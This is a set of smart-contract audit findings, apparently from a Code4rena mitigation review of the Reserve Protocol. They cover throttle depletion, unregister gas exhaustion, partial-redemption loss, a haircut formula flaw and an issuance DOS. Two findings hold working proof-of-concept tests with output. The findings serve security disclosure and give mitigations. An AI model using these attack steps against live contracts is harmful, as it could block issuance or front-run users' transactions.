# Lines of code  https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/libraries/Throttle.sol#L66-L75   # Vulnerability details  ## Impact Attacker can deplete available issuance or redemption by first issuing and then redeeming in the same tx or vice versa. The available redemption/issuance will eventually grow back, but this temporary reduces the available amount. This can also use to front run other user who tries to redeem/issue in order to fail their tx.   ## Proof of Concept In the PoC below a user is able to reduce the redemption available by more than 99% (1e20 to 1e14), and that's without spending anything but gas (they end up with the same amount of RToken as before)    ```diff diff --git a/test/RToken.test.ts b/test/RToken.test.ts index e04f51db..33044b79 100644 --- a/test/RToken.test.ts +++ b/test/RToken.test.ts @@ -1293,6 +1293,31 @@ describe(`RTokenP${IMPLEMENTATION} contract`, () => {            )          })   +        it('PoC', async function () { +          const rechargePerBlock = config.issuanceThrottle.amtRate.div(BLOCKS_PER_HOUR); + +          advanceTime(60*60*5); + +          let totalSupply =  await rToken.totalSupply(); +          let redemptionAvailable = await rToken.redemptionAvailable(); +          let issuanceAvailable = await rToken.issuanceAvailable(); + +          console.log({redemptionAvailable, issuanceAvailable, totalSupply}); + +          let toIssue = redemptionAvailable.mul(111111n).div(100000n); +          await rToken.connect(addr1).issue(toIssue); +          await rToken.connect(addr1).redeem(toIssue, true); + + + +          redemptionAvailable = await rToken.redemptionAvailable(); +          issuanceAvailable = await rToken.issuanceAvailable(); +          console.log("after", {redemptionAvailable, issuanceAvailable}); +          return; + +        }); +        return; +          it('Should update issuance throttle correctly on redemption', async function () {            const rechargePerBlock = config.issuanceThrottle.amtRate.div(BLOCKS_PER_HOUR)   @@ -1335,6 +1360,7 @@ describe(`RTokenP${IMPLEMENTATION} contract`, () => {        })      })    }) +  return;      describe('Melt/Mint #fast', () => {      const issueAmount: BigNumber = bn('100e18')  ```  Output: ``` {   redemptionAvailable: BigNumber { value: "10000000000000000000" }, // 1e20   issuanceAvailable: BigNumber { value: "1000000000000000000000000" },   totalSupply: BigNumber { value: "100000000000000000000" } } after {   redemptionAvailable: BigNumber { value: "10000000000000" }, // 1e14   issuanceAvailable: BigNumber { value: "1000000000000000000000000" } } ```  ## Recommended Mitigation Steps Mitigating this issue seems a bit tricky. One way is at the end of `currentlyAvailable()` to return the max of `available` and `throttle.lastAvailable` (up to some limit, in order not to allow to much of it to accumulate).
# Lines of code  https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/AssetRegistry.sol#L91-L104   # Vulnerability details  ## Impact The AssetRegistry contains an `unregister` function which can be used to detach a bad collateral from the RToken system.  Previously [M-16](https://github.com/code-423n4/2023-01-reserve-findings/issues/254) was reported as an issue for the RToken system in which a single bad collateral can stop the working of RToken protocol.  To fix M-16, the `basketHandler.quantity` call was wrapped in a `try/catch` block so that the statement can handle any unexpected revert from the collateral contract.  While the fix handles unexpected reverts, it misses the case which the `basketHandler.quantity` call may consume the entire transaction gas.  So, if for some reasons the Collateral contract start consuming more gas than the allowed block gas limit, the `basketHandler.quantity` call will always fail, resulting in the revert of `unregister` call.  This essentially prevent governance from unregistering a collateral from the RToken. The unregistering of a collateral is still dependent upon the code execution of the collateral token contract.   ## Proof of Concept Consider this scenario:   - TokenA was registered as an asset in AssetRegistry.  - Due to an upgrade/bug/hack the TokenA starts consuming all available gas on function calls.  - The RToken governance decides to unregister the TokenA asset and calls the `AssetRegistry.unregister` function.  - Internal call chain invokes any function of TokenA contract. The txn reverts with an out of gas error.  - The governance is now unable to unregister TokenA from RToken protocol and RToken is now unusable.  ## Tools Used Manual review  ## Recommended Mitigation Steps Consider detaching the interaction with collateral contract completely from the unregistering contract flow. Unregistering a contract must never depend upon the code execution of Collateral token contract.
# Lines of code  https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/p1/RToken.sol#L215   # Vulnerability details  ### Original issue: [M-04: Redemptions during undercollateralization can be hot-swapped to steal all funds)](https://github.com/code-423n4/2023-01-reserve-findings/issues/399)  ## Impact User might be agreeing to a partial redemption expecting to lose only a small fraction, but end up losing a significantly higher fraction.  ### Details  * Issue was that user might get only partial redemption when they didn't intend to - they sent a tx to the pool, in the meanwhile an asset got disabled and replaced. Redeemer doesn't get any share of the disabled collateral, and the backup collateral balance is zero. * Mitigation adds a parameter named `revertOnPartialRedemption`, if the parameter is false the redeeming would revert if any collateral holds only part of the asset. * This is suppose to solve this issue since in the case above the user would set it to false and the redeeming tx would revert * The issue is that there might be a case where the protocol holds only a bit less than the quantity required (e.g. 99%), and in that case the user would be setting `revertOnPartialRedemption` to true, expecting to get 99% of the value of the basket. Then if an asset is disabled and replaced the user would suffer a loss much greater than they've agreed to.  ## PoC ### Likelihood Mostly the protocol wouldn't be undercollateralized for a long time, since there would either by trading going on to cover it or eventually there would be a haircut. But there can still be periods of time where this happens: * Governance increased the basket quantity of one asset a bit (expecting the yield to cover for it), trading won't start till `tradingDelay` passes. Meaning a few hours where only partial redemption would be possible. * Another asset got disabled first, and replaced by a backup asset. The protocol either had enough balance of the backup asset or covered up for it via trading. Yet again, this won't last long since eventually all trading would complete and the protocol would go to a haircut, but there can be multiple trading of multiple assets which would make it last up to a few hours.   ## Mitigation The ideal solution would be to allow the user to specify the min amount for each asset or the min ratio of the between the total redemption value and the basket value, but that would be too expensive and complicated. I think the middle way here would be to replace `revertOnPartialRedemption` parameter with a single numeric parameter that specifies the min ratio that the user expects to get (i.e. if that parameter is set to 90%, that means that if any asset holds less than 90% than the quantity it should the redemption would revert). This shouldn't cost much more gas, and would cover most of the cases.
# Lines of code  https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/p1/mixins/RecollateralizationLib.sol#L146-L245   # Vulnerability details  # Mitigation of H-02: Issue not fully mitigated ### Original issue: [H-02: Basket range formula is inefficient, leading the protocol to unnecessary haircut](https://github.com/code-423n4/2023-01-reserve-findings/issues/235)   ## Not mitigated - top range can still be too high, leading to unnecessary haircut * The applied mitigation follows the line of the mitigation suggested (disclosure: by me :)) in the original issue, however after reviewing it I found out that it doesn't fully mitigate the issue. * The original issue was that basket range band is too wide, with both top range being too high and bottom range too low * The bottom range is mitigated now * As for the top range - even though it's more efficient now, it still can result in a top range that doesn't make sense.  ## Impact Protocol might go for an unnecessary haircut, causing a loss for RToken holders. In the scenario below we can trade to get ~99% of baskets needed, but instead the protocol goes for a 50% haircut.  After the haircut the baskets held per supply ratio might grow back via `handoutExcessAssets` and `Furnace` however: * Not all excess asset goes to `Furnace` * `Furnace` grows slowly over time and in the meantime     * Redemption would be at the lower baskets per supply     * New users can issue in the meanwhile, diluting the melting effect  In more extreme cases the baskets held can be an extremely low number that might even cause the haircut to fail due to `exchangeRateIsValidAfter` modifier on `setBasketsNeeded()`. This would mean trading would be disabled till somebody sends enough balance to the undercollateralized asset.      ## PoC  Consider the following scenario: * A basket is composed of 30 USDc and 1 ETH * The prices are:     * 1 USDc = 1 USD     * ETH = 1500 USD * Therefore the total basket value is 1515 USD * Protocol holds 1000 baskets * Governance changes the USDC quantity to 30 USDC * Baskets held now is only 500, since we hold only 15K USDC * Bottom range would be `basketsHeld + (excess_ETH * ETH_lowPrice / basket_highPrice) = 500 + (1500 * 500 * 0.99 / (1530 * 1.01)) = 980` * Top range would be `basketsHeld + (excess_ETH * ETH_highPrice / basket_lowPrice) = 500 + (1500 * 500 * 1.01 / (1530 * 0.99)) = 1000` * This is clearly a wrong estimation, which would lead to a haircut of 50% (!) rather than going for a trade.  Note: I mentioned governance change for simplicity, but this can also happen without governance intervention when a collateral gets disabled, it's value declines and a backup asset kicks in (at first the disabled asset would get traded and cover up some of the deficit and then we'd go for a haircut)  ## Mitigation * A more efficient formula would be to use the max baskets held (i.e. the maximum of (each collateral balance divided by the basket_quantity of that collateral)) and then subtract from that the lowest estimation of baskets missing (i.e. lowest value estimation of needed assets to reach that amount divided by highest estimation of basket value).     * In the case above that would mean `maxBasketsHeld - (USDC_deficit * USDC_lowPrice / basket_highPrice) = 1000 - (500 * 30 * 0.99 / (1530 * 1.01)) = 990.4`. Freeing up 9.6 ETH for sale * The suggested formula might get us a higher top range estimation when the case is the other way around (the collateral that makes the larger part of the basket value is missing, in our case ETH is missing and USDC not), but it wouldn't result in a haircut and still go for trading (since the top range would be closer to baskets held)   Even with the mitigation above there can be extreme cases where a single asset holds a very small fraction of the total basket value (e.g. 0.1%) and the mitigation wouldn't help much in this case. There might be a need to come up with a broader mitigation for the issue that haircut is done to the number of baskets held rather than bottom range even though the difference between the two can be significant. Or set a threshold for the fraction of the value that each collateral holds in the total value of the basket. 
# Lines of code  https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/RToken.sol#L308-L312 https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/RToken.sol#L132   # Vulnerability details  ## Impact An early attacker can DOS the `issue` functionality in the `RToken` contract.    No issuances can be made. And the DOS cannot be recovered from. It is permanent.    ## Proof of Concept You can add the following test to the `Furnace.test.ts` file and execute it with `yarn hardhat test --grep 'M-05 Mitigation Error: DOS issue'`.    ```typescript describe('M-05 Mitigation Error', () => {     beforeEach(async () => {       // Approvals for issuance       await token0.connect(addr1).approve(rToken.address, initialBal)       await token1.connect(addr1).approve(rToken.address, initialBal)       await token2.connect(addr1).approve(rToken.address, initialBal)       await token3.connect(addr1).approve(rToken.address, initialBal)        await token0.connect(addr2).approve(rToken.address, initialBal)       await token1.connect(addr2).approve(rToken.address, initialBal)       await token2.connect(addr2).approve(rToken.address, initialBal)       await token3.connect(addr2).approve(rToken.address, initialBal)        // Issue tokens       const issueAmount: BigNumber = bn('100e18')       // await rToken.connect(addr1).issue(issueAmount)       // await rToken.connect(addr2).issue(issueAmount)     })      it('M-05 Mitigation Error: DOS issue', async () => {       /* attack vector actually so bad that attacker can block issuance a loooong time?       */       console.log("Total supply");       console.log(await rToken.totalSupply());        const issueAmount: BigNumber = bn('1e17')       await rToken.connect(addr1).issue(issueAmount)        console.log("Total supply");       console.log(await rToken.totalSupply());        const transferAmount: BigNumber = bn('1e16')       rToken.connect(addr1).transfer(furnace.address, transferAmount);        await advanceTime(3600);        await furnace.connect(addr1).melt()              await advanceTime(3600);        console.log("rToken balance of furnace");       console.log(await rToken.balanceOf(furnace.address));        /* rToken can not be issued       */        await expect(rToken.connect(addr1).issue(issueAmount)).to.be.revertedWith('rToken supply too low to melt')        console.log("rToken balance of furnace");       console.log(await rToken.balanceOf(furnace.address));        /* rToken can not be issued even after time passes       */        await advanceTime(3600);        await expect(rToken.connect(addr1).issue(issueAmount)).to.be.revertedWith('rToken supply too low to melt')        /* rToken.melt cannot be called directly either       */        await expect(rToken.connect(addr1).melt(transferAmount)).to.be.revertedWith('rToken supply too low to melt')     })   }) ```  The attack performs the following steps:    1. Issue `1e17` rToken 2. Transfer `1e16` rToken to the furnace 3. Wait 12 seconds and call `Furnace.melt` such that the furnace takes notice of the transferred rToken and can pay them out later 4. Wait at least 12 seconds such that the furnace would actually call `RToken.melt` 5. Now `RToken.issue` and `RToken.melt` are permanently DOSed  ## Tools Used VSCode  ## Recommended Mitigation Steps Use a try-catch block for `furnace.melt` in the `RToken.issueTo` function.    ```diff diff --git a/contracts/p1/RToken.sol b/contracts/p1/RToken.sol index 616b1532..fc584688 100644 --- a/contracts/p1/RToken.sol +++ b/contracts/p1/RToken.sol @@ -129,7 +129,7 @@ contract RTokenP1 is ComponentP1, ERC20PermitUpgradeable, IRToken {          // Ensure SOUND basket          require(basketHandler.status() == CollateralStatus.SOUND, "basket unsound");   -        furnace.melt(); +        try main.furnace().melt() {} catch {}          uint256 supply = totalSupply();            // Revert if issuance exceeds either supply throttle ```  The only instance when `furnace.melt` reverts is when the `totalSupply` is too low. But then it is ok to catch the exception and just continue with the issuance and potentially lose rToken appreciation.    Potentially losing some rToken appreciation is definitely better than having this attack vector.    The `RToken.redeemTo` function already has the call to the `furnance.melt` function wrapped in a try-catch block. So redemption cannot be DOSed.   
